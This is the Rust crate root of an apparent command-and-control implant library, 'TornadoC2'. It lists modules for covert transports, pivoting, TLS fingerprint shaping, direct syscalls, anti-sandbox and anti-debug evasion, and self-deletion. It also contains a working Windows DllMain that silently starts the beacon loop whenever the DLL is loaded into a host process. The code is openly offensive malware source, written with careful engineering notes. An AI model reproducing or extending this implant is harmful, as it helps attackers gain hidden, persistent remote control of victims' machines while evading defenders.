//! TornadoC2 agent library. Both `beacon` and `stager` link
//! against this.
//!
//! The crate root exposes every module the runtime needs plus the
//! build-time constants `build.rs` generates. The constants live in
//! a `pub(crate) mod config_generated` so a downstream consumer
//! sees them through `agent::config::*` (the public, stable path)
//! rather than `agent::config_generated::*` (the internal one).
//!
//! When the `wasm-host` Cargo feature is enabled, the WASM
//! extension host is compiled in under `core::extensions`; when it
//! is off, the same module path resolves to a stub that returns a
//! clear error. Callers use `agent::core::extensions` and never
//! need to know which state the binary is in.
//!
//! # Naming hazard — `core` shadows the standard `core` crate
//!
//! The module `pub mod core` below shadows the standard
//! library's `core` crate for path resolution **inside this
//! crate**. Any code in this crate that writes `core::ffi::c_void`
//! or `core::mem::zeroed` resolves to `crate::core::...`, not
//! `::core::...`. Use `std::ffi::c_void` and `std::mem::...`
//! everywhere, or write `::core::...` with a leading `::` to
//! force the std path. This is not a bug in the module — it is a
//! consequence of the migration map keeping the `core` name —
//! but it is a trap for anyone reading a signature and expecting
//! std's `core`.

// ---------------------------------------------------------------------
// Build-time constants.
//
// `build.rs` writes `config_generated.rs` into `OUT_DIR` from the
// `TC2_*` environment variables. The file contains one `pub const`
// per build-time value. `config.rs` re-exports every const so the
// public API is `agent::config::DEFAULT_URL` etc.; the module
// itself is crate-private so external code cannot depend on the
// raw generated names.
pub(crate) mod config_generated {
    include!(concat!(env!("OUT_DIR"), "/config_generated.rs"));
}

// ---------------------------------------------------------------------
// Public modules.
//
// Order is roughly dependency order: wire types first, then crypto,
// then the pieces that carry them, then the OS layer, then the
// binary entry points. Rust does not enforce ordering here — this
// is documentation for a reader who wants to trace a call.

pub mod config;          // pub use config_generated::*, b64(), parse_clock()
pub mod protocol;        // Task, Result, Identity, Transport trait
pub mod crypto;          // WireSession, ECDH, AES-GCM
pub mod features;        // shaping

pub mod pivot;           // peer-to-peer pivot handshake
pub mod tlsfp;           // ClientHello profile helpers

pub mod transport;       // ten transports

pub mod native;          // platform-agnostic native helpers
pub mod platform;        // machine_id, self_delete, worker
pub mod syscalls;        // direct / indirect
pub mod evasion;         // anti-sandbox, anti-debug, sleep-mask
pub mod verbs;           // cross-platform utility verbs

pub mod core;            // agent loop, dispatch, helpers
pub mod stager;          // stager-only loader

// `core::extensions` is declared inside `core/mod.rs` so the WASM
// host lives at the same path whether the feature is on or off.
// Do not declare it here.

// ---------------------------------------------------------------------
// DLL entry point.
//
// `output_format = "dll"` builds on Windows link against this
// crate as a `cdylib`. Cargo produces the DLL but nothing calls
// into it unless we export a `DllMain`, so this is the one place
// the DLL build differs from the executable build at link time.
//
// The body spawns the agent loop on a fresh thread and returns
// immediately — `DllMain` must not block, and must not perform
// work that can deadlock the loader lock. The spawned thread runs
// the same `core::agent::run` the executable calls; the loader
// lock is not held while it runs.
//
// The runtime is built with the same worker/blocking thread
// configuration `bin/beacon.rs` uses. A DLL loaded into a host
// process that itself runs many threads must not spawn
// `num_cpus` workers on top; two async workers and a small
// blocking pool is the ceiling the beacon needs.
#[cfg(all(feature = "dll", target_os = "windows"))]
#[no_mangle]
pub extern "system" fn DllMain(
    _hinst: *mut std::ffi::c_void,
    _reason: u32,
    _reserved: *mut std::ffi::c_void,
) -> i32 {
    // Run only on DLL_PROCESS_ATTACH. Every other reason code is
    // ignored; the process is going away or a thread is being
    // cleaned up, and neither path needs to start the beacon.
    const DLL_PROCESS_ATTACH: u32 = 1;
    if _reason == DLL_PROCESS_ATTACH {
        let _ = std::thread::Builder::new()
            .name("beacon-dll-main".into())
            .spawn(|| {
                let cfg = crate::core::agent::Config::from_consts();
                let rt = match tokio::runtime::Builder::new_multi_thread()
                    .worker_threads(2)
                    .max_blocking_threads(8)
                    .enable_all()
                    .thread_name("beacon-dll")
                    .build()
                {
                    Ok(rt) => rt,
                    Err(_) => return,
                };
                let _ = rt.block_on(async move {
                    match crate::core::agent::new_agent(cfg).await {
                        Ok(mut a) => a.run().await,
                        Err(e) => Err(e),
                    }
                });
            });
    }
    1 // TRUE — DLL_PROCESS_ATTACH succeeded
}

// =====================================================================
// Crate-wide diagnostics macro
// =====================================================================

/// Emit a diagnostic on stderr, gated on `config::VERBOSE`.
///
/// The macro takes the same format-argument syntax as
/// `eprintln!`; there is no separate `format!` step.
///
/// `$crate::config::VERBOSE` (not `crate::config::VERBOSE`) is
/// required: the macro is `#[macro_export]`ed and is called from
/// `bin/beacon.rs` and `bin/stager.rs`, which are separate crates
/// that depend on `agent`. A bare `crate::` in the expansion
/// would resolve to the caller's crate and fail.
#[macro_export]
macro_rules! diag {
    ($($arg:tt)*) => {
        if $crate::config::VERBOSE {
            eprintln!($($arg)*);
        }
    };
}